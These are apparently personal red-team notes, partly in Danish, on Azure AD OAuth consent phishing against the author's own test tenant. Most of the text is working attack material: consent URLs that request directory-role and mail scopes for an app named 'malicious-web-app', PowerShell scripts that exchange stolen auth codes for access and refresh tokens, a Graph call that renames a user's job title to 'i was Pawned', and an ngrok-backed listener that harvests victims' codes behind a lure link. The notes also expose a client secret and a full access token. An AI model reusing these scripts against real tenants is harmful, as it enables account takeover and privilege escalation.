Tog over til kaerby (jimmey) for at teste om jeg havde cracked OAuth MFA via. SP

man kan udvide scope ved at bruge
`scope=User.Read%20User.ReadWrite%20Mail.Read%20Mail.Send`
så en request vkunne så sådan her ud.
```typescript
https://login.microsoftonline.com/{tenantId}/oauth2/v2.0/authorize?
client_id={clientId}
&response_type=code
&redirect_uri={redirectUri}
&scope=User.Read User.ReadWrite.All offline_access RoleManagement.ReadWrite.Directory
&response_mode=query
&prompt=consent
```
https://login.microsoftonline.com/5dc7e152-c906-4d95-bd1a-bcf75eb3e939/oauth2/v2.0/authorize?client_id=675c27b6-e1ff-4a2c-924e-701186f97951&response_type=code&redirect_uri=https://malicious-web-app.azurewebsites.net/.auth/login/aad/callback&scope=User.Read%20User.ReadWrite.All%20Mail.Read%20Mail.Send%20RoleManagement.ReadWrite.Directory&response_mode=query&prompt=consent


jeg fandt også ud af at man kan bede om en refreshtoken ved at tilføje  `offline_access` i scope så ville requesten være
```bash
$tenantId = "<your-tenant-id>"
$clientId = "<your-client-id>"
$clientSecret = "<your-client-secret>"
$authCode = "<your-authorization-code>"
$redirectUri = "https://your-redirect-uri"

$body = @{
    client_id     = $clientId
    client_secret = $clientSecret
    code          = $authCode
    redirect_uri  = $redirectUri
    grant_type    = "authorization_code"
    scope         = "User.Read User.ReadWrite offline_access RoleManagement.ReadWrite.Directory"
}

$response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token" `
    -Method Post `
    -ContentType "application/x-www-form-urlencoded" `
    -Body $body

Write-Output "Access Token: $($response.access_token)"
Write-Output "Refresh Token: $($response.refresh_token)"
```

**og for at bruge refresh token**
```bash
$tenantId = "<your-tenant-id>"
$clientId = "<your-client-id>"
$clientSecret = "<your-client-secret>"
$refreshToken = "<your-refresh-token>" # no auth-code or 

$body = @{
    client_id     = $clientId
    client_secret = $clientSecret
    refresh_token = $refreshToken
    grant_type    = "refresh_token"
    scope         = "User.Read User.ReadWrite offline_access"
}

$response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token" `
    -Method Post `
    -ContentType "application/x-www-form-urlencoded" `
    -Body $body

Write-Output "New Access Token: $($response.access_token)"
Write-Output "New Refresh Token: $($response.refresh_token)"

```


## Getting the access token as user
```bash
$authCode = "auth code from burp"
>> $redirectUri = "https://malicious-web-app.azurewebsites.net/.auth/login/aad/callback"
>> $clientId = "675c27b6-e1ff-4a2c-924e-701186f97951"
>> $clientSecret = "eV68Q~WEECCIzSJKzATfkd2rly.Kxds1SFzNDbyg"
>> $tenantId = "5dc7e152-c906-4d95-bd1a-bcf75eb3e939"
>>
>> $body = @{
>>     client_id     = $clientId
>>     client_secret = $clientSecret
>>     code          = $authCode
>>     redirect_uri  = $redirectUri
>>     grant_type    = "authorization_code"
>>     scope         = "User.ReadWrite"
>> }
>>
>> $response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token" `
>>     -Method Post `
>>     -ContentType "application/x-www-form-urlencoded" `
>>     -Body $body
>>
>> Write-Output "Access Token: $($response.access_token)"
```
**this will spit out the access token who can then be used to run commands on behalf of a user**

---
```bash
$accessToken = "eyJ0eXAiOiJKV1QiLCJub25jZSI6IkM1MjR2NW9pZzJpdUkwMXBOdTZuSVV2V0JJMWhQbENiRXhKcVA1WDczV3MiLCJhbGciOiJSUzI1NiIsIng1dCI6IllUY2VPNUlKeXlxUjZqekRTNWlBYnBlNDJKdyIsImtpZCI6IllUY2VPNUlKeXlxUjZqekRTNWlBYnBlNDJKdyJ9.eyJhdWQiOiIwMDAwMDAwMy0wMDAwLTAwMDAtYzAwMC0wMDAwMDAwMDAwMDAiLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC81ZGM3ZTE1Mi1jOTA2LTRkOTUtYmQxYS1iY2Y3NWViM2U5MzkvIiwiaWF0IjoxNzM5MjYwMzUwLCJuYmYiOjE3MzkyNjAzNTAsImV4cCI6MTczOTI2NTA4NiwiYWNjdCI6MCwiYWNyIjoiMSIsImFpbyI6IkFWUUFxLzhaQUFBQXRDa0JKRk9oMFVIZFEreGVwSFJISEJabmFvanZxWVF3U3VpT0NUZjVQK2RJb1FIemtBVy93bFE5QlJZRXlxY3F3WnVPb0tiN2lyWHF0THV4Mnk2YkNUZURhOGM1T2hDejhJUEpyK0xoY3RjPSIsImFtciI6WyJwd2QiXSwiYXBwX2Rpc3BsYXluYW1lIjoiTWFsaWNpb3VzLVdlYi1BcHAiLCJhcHBpZCI6IjY3NWMyN2I2LWUxZmYtNGEyYy05MjRlLTcwMTE4NmY5Nzk1MSIsImFwcGlkYWNyIjoiMSIsImlkdHlwIjoidXNlciIsImlwYWRkciI6IjE5NC4xODIuMTMuNDMiLCJuYW1lIjoidGVzdHVzZXIiLCJvaWQiOiJmMDJkYzZlNC02OTU5LTQ3MGItOTA0Yi1iY2IwNmQ5ZmUwYzAiLCJwbGF0ZiI6IjMiLCJwdWlkIjoiMTAwMzIwMDQ0NTUwMTMxOSIsInJoIjoiMS5BYThBVXVISFhRYkpsVTI5R3J6M1hyUHBPUU1BQUFBQUFBQUF3QUFBQUFBQUFBQWRBWHl2QUEuIiwic2NwIjoiVXNlci5SZWFkIFVzZXIuUmVhZFdyaXRlIFVzZXIuUmVhZFdyaXRlLkFsbCBwcm9maWxlIG9wZW5pZCBlbWFpbCIsInNpZCI6IjAwMjAzYTE5LTBlYjItNTliNS0wMzAwLTY1NDE4YTJiMzRjYSIsInN1YiI6IkVMVDV3eU1uTE1ZX3hCRFUwU0Z5UHp5Y0k5WVRINWRZS0xFa0RGdFJpUDAiLCJ0ZW5hbnRfcmVnaW9uX3Njb3BlIjoiRVUiLCJ0aWQiOiI1ZGM3ZTE1Mi1jOTA2LTRkOTUtYmQxYS1iY2Y3NWViM2U5MzkiLCJ1bmlxdWVfbmFtZSI6InRlc3R1c2VyQENsb3VkYnJlYWtlcnNob3RtYWlsLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6InRlc3R1c2VyQENsb3VkYnJlYWtlcnNob3RtYWlsLm9ubWljcm9zb2Z0LmNvbSIsInV0aSI6Ijd4X2VKOWRGUWtPSXpMRGN5TG1aQUEiLCJ2ZXIiOiIxLjAiLCJ3aWRzIjpbImZlOTMwYmU3LTVlNjItNDdkYi05MWFmLTk4YzNhNDlhMzhiMSIsImI3OWZiZjRkLTNlZjktNDY4OS04MTQzLTc2YjE5NGU4NTUwOSJdLCJ4bXNfZnRkIjoiWEVGb21SYm1pcUxmb1loOUxNT2paVzRUTTlRZEd4NW5QZEp5Mi01aV9vQSIsInhtc19pZHJlbCI6IjEgMTgiLCJ4bXNfc3QiOnsic3ViIjoiUUFRYjhaMGdtVW8yZzBiODZkcUJoTzQ0QjhkQU9XbVpMZ1lOUzJNeUttcyJ9LCJ4bXNfdGNkdCI6MTcxMjA1NzIzMCwieG1zX3RkYnIiOiJFVSJ9.bO3JL9VbmGw63I18ndQHbDkJqLmnVXCVQwy8v_B9_T1c_4-MY51M78PX_k3V1jaZG2dESkofTUAiqEZ3NDzbF6CTKszhlvAcOePfJ4AIztSSZm78yRNbX3oY78tLuQG2mGWv7Jo7ECQYzVO2N1QuwP41On4OMwPFzjLZd1xNgpPurLcuXksyimjUOKArFRnpSyi8L1qr2iQoKWKEFnSCjiHJOC1U_TSi5fEG-VSzjuHQ3taCuRIPicOTQJIvVHJtYVDGLsoQbAu7hKcCmZTRGx3QGLNdGq9K9wNo6QW48MEZI37nlsGnZ_hrPvNI1lH6Jr1cwHO47gfRBPKZZh8xPg"
>> Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" -Headers @{ Authorization = "Bearer $accessToken" }
```
**As an example this will list information on the user "me" (the one this access token belongs to)**

```bash
$accessToken = "eyJ0eXAiOiJKV1QiLCJub25jZSI6IkM1MjR2NW9pZzJpdUkwMXBOdTZuSVV2V0JJMWhQbENiRXhKcVA1WDczV3MiLCJhbGciOiJSUzI1NiIsIng1dCI6IllUY2VPNUlKeXlxUjZqekRTNWlBYnBlNDJKdyIsImtpZCI6IllUY2VPNUlKeXlxUjZqekRTNWlBYnBlNDJKdyJ9.eyJhdWQiOiIwMDAwMDAwMy0wMDAwLTAwMDAtYzAwMC0wMDAwMDAwMDAwMDAiLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC81ZGM3ZTE1Mi1jOTA2LTRkOTUtYmQxYS1iY2Y3NWViM2U5MzkvIiwiaWF0IjoxNzM5MjYwMzUwLCJuYmYiOjE3MzkyNjAzNTAsImV4cCI6MTczOTI2NTA4NiwiYWNjdCI6MCwiYWNyIjoiMSIsImFpbyI6IkFWUUFxLzhaQUFBQXRDa0JKRk9oMFVIZFEreGVwSFJISEJabmFvanZxWVF3U3VpT0NUZjVQK2RJb1FIemtBVy93bFE5QlJZRXlxY3F3WnVPb0tiN2lyWHF0THV4Mnk2YkNUZURhOGM1T2hDejhJUEpyK0xoY3RjPSIsImFtciI6WyJwd2QiXSwiYXBwX2Rpc3BsYXluYW1lIjoiTWFsaWNpb3VzLVdlYi1BcHAiLCJhcHBpZCI6IjY3NWMyN2I2LWUxZmYtNGEyYy05MjRlLTcwMTE4NmY5Nzk1MSIsImFwcGlkYWNyIjoiMSIsImlkdHlwIjoidXNlciIsImlwYWRkciI6IjE5NC4xODIuMTMuNDMiLCJuYW1lIjoidGVzdHVzZXIiLCJvaWQiOiJmMDJkYzZlNC02OTU5LTQ3MGItOTA0Yi1iY2IwNmQ5ZmUwYzAiLCJwbGF0ZiI6IjMiLCJwdWlkIjoiMTAwMzIwMDQ0NTUwMTMxOSIsInJoIjoiMS5BYThBVXVISFhRYkpsVTI5R3J6M1hyUHBPUU1BQUFBQUFBQUF3QUFBQUFBQUFBQWRBWHl2QUEuIiwic2NwIjoiVXNlci5SZWFkIFVzZXIuUmVhZFdyaXRlIFVzZXIuUmVhZFdyaXRlLkFsbCBwcm9maWxlIG9wZW5pZCBlbWFpbCIsInNpZCI6IjAwMjAzYTE5LTBlYjItNTliNS0wMzAwLTY1NDE4YTJiMzRjYSIsInN1YiI6IkVMVDV3eU1uTE1ZX3hCRFUwU0Z5UHp5Y0k5WVRINWRZS0xFa0RGdFJpUDAiLCJ0ZW5hbnRfcmVnaW9uX3Njb3BlIjoiRVUiLCJ0aWQiOiI1ZGM3ZTE1Mi1jOTA2LTRkOTUtYmQxYS1iY2Y3NWViM2U5MzkiLCJ1bmlxdWVfbmFtZSI6InRlc3R1c2VyQENsb3VkYnJlYWtlcnNob3RtYWlsLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6InRlc3R1c2VyQENsb3VkYnJlYWtlcnNob3RtYWlsLm9ubWljcm9zb2Z0LmNvbSIsInV0aSI6Ijd4X2VKOWRGUWtPSXpMRGN5TG1aQUEiLCJ2ZXIiOiIxLjAiLCJ3aWRzIjpbImZlOTMwYmU3LTVlNjItNDdkYi05MWFmLTk4YzNhNDlhMzhiMSIsImI3OWZiZjRkLTNlZjktNDY4OS04MTQzLTc2YjE5NGU4NTUwOSJdLCJ4bXNfZnRkIjoiWEVGb21SYm1pcUxmb1loOUxNT2paVzRUTTlRZEd4NW5QZEp5Mi01aV9vQSIsInhtc19pZHJlbCI6IjEgMTgiLCJ4bXNfc3QiOnsic3ViIjoiUUFRYjhaMGdtVW8yZzBiODZkcUJoTzQ0QjhkQU9XbVpMZ1lOUzJNeUttcyJ9LCJ4bXNfdGNkdCI6MTcxMjA1NzIzMCwieG1zX3RkYnIiOiJFVSJ9.bO3JL9VbmGw63I18ndQHbDkJqLmnVXCVQwy8v_B9_T1c_4-MY51M78PX_k3V1jaZG2dESkofTUAiqEZ3NDzbF6CTKszhlvAcOePfJ4AIztSSZm78yRNbX3oY78tLuQG2mGWv7Jo7ECQYzVO2N1QuwP41On4OMwPFzjLZd1xNgpPurLcuXksyimjUOKArFRnpSyi8L1qr2iQoKWKEFnSCjiHJOC1U_TSi5fEG-VSzjuHQ3taCuRIPicOTQJIvVHJtYVDGLsoQbAu7hKcCmZTRGx3QGLNdGq9K9wNo6QW48MEZI37nlsGnZ_hrPvNI1lH6Jr1cwHO47gfRBPKZZh8xPg"
>> $userId = "testuser@Cloudbreakershotmail.onmicrosoft.com"
>> $newJobTitle = "-i was Pawned" #set new jobtitle here
>>
>> $body = @{
>>     jobTitle = $newJobTitle
>> } | ConvertTo-Json -Depth 10
>>
>> $headers = @{
>>     Authorization  = "Bearer $accessToken"
>>     "Content-Type" = "application/json"
>> }
>>
>> Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users/$userId" `
>>     -Method PATCH `
>>     -Headers $headers `
>>     -Body $body
```
**This would change the users job title to "-i was Pawned" ** 
![[changed testuers jobtitle to Pawned.png]]

## Getting the access token as the SP



#### test
after the user authenticates
```bash
$tenantId = "<your-tenant-id>"
$clientId = "<your-client-id>"
$clientSecret = "<your-client-secret>"
$userAccessToken = "<user-access-token>"

$body = @{
    client_id     = $clientId
    client_secret = $clientSecret
    grant_type    = "urn:ietf:params:oauth:grant-type:jwt-bearer"
    assertion     = $userAccessToken
    requested_token_use = "on_behalf_of"
    scope         = "https://graph.microsoft.com/User.ReadWrite.All"
}

$response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token" `
    -Method Post `
    -ContentType "application/x-www-form-urlencoded" `
    -Body $body

$delegatedAccessToken = $response.access_token
Write-Output "Delegated Access Token: $delegatedAccessToken"
```

#### test 2: Redirecting to external url, grab the auth_code, redirect back to app


```bash
# Define the local server's IP and Port 
$localIP = "*"
$localPort = "5000"

# Define the SP informatin 
$clientId = "675c27b6-e1ff-4a2c-924e-701186f97951"
$clientSecret = "eV68Q~WEECCIzSJKzATfkd2rly.Kxds1SFzNDbyg"
$tenantId = "5dc7e152-c906-4d95-bd1a-bcf75eb3e939"
$OriginalUrl = "https://malicious-web-app.azurewebsites.net/.auth/login/aad/callback"
$redirectUri = "https://b9e6-152-115-163-102.ngrok-free.app"  # The url that server should redirect to



# Start the HTTP Listener to catch the Authorization Code
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://$localIP`:$localPort/")  # Start a local listener on port 5000
$listener.Start()
Write-Host "Listening on http://$localIP`:$localPort Waiting for an authorization request..."



# Accept incoming request
$context = $listener.GetContext()
$request = $context.Request
$response = $context.Response

# Debug Output
Write-Host "Received a request! `n"


# Get the authorization code from the request
Write-Host "Full Query String: $($request.Url.Query) `n"
$authCode = $request.QueryString["code"]
if ($authCode) {
    Write-Host "Received Auth Code: $authCode `n"    
    
    # Now place the auth code inside the body of th request
    $body = @{
        client_id     = $clientId
        client_secret = $clientSecret
        code          = $authCode
        redirect_uri  = $redirectUri
        grant_type    = "authorization_code"
        scope         = "User.ReadWrite"
    }
    
    # Request to get the Access Token
    Try{
	    $tokenResponse = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token" `
	        -Method Post `
	        -ContentType "application/x-www-form-urlencoded" `
	        -Body $body
        
	    Write-Host "Access Token: $($tokenResponse.access_token) `n"
    } catch {
	    Write-Host "Error obtaining acces Token: ..."
    }
    # Perform the redirect using HTTP 302
    $response.StatusCode = 302  # HTTP 302 Found (Redirect)
    $response.Headers.Add("Location", $finalRedirectUrl)
    $response.OutputStream.Close()
    $response.Close()

} else {
    Write-Host "No authorization code found in the request."
}

# Close the listener
$listener.Stop()

```

[hello there](https://login.microsoftonline.com/5dc7e152-c906-4d95-bd1a-bcf75eb3e939/oauth2/v2.0/authorize?client_id=675c27b6-e1ff-4a2c-924e-701186f97951&response_type=code&redirect_uri=https://b9e6-152-115-163-102.ngrok-free.app&scope=User.ReadWrite%20RoleManagement.ReadWrite.Directory&response_mode=query&prompt=consent)



